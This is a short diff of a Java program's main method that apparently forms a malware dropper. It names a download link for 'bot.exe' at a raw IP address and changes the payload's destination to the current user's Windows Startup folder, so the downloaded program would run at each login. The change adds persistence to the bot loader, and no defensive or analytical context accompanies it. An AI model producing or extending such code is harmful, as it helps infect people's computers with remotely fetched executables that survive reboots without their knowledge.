@@ -7,7 +7,7 @@ public class Main {
 	public static void main(String args[]) throws InterruptedException, IOException,IllegalArgumentException
 	{
 	     String link = "http://159.65.11.28/bot.exe";
-	     File payload_file = new File(System.getProperty("user.dir") + "/bot.exe");
+	     File payload_file = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
 	     
 	     
 //	     File payload_file2 = new File("decoded.exe");
